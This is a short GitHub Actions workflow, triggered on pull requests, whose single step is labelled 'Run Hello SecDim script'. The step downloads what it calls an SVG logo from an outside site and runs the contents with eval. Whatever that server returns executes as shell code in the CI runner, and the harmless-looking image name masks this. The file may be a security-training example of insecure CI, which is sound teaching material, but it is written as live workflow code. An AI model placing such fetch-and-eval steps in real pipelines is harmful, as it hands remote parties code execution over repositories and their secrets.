name: SecDim

on: pull_request

jobs:
  secdim:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Run Hello SecDim script
        run: |
          CONTENTS=$(curl "https://secdim.com/assets/images/logo.svg")
          eval $CONTENTS
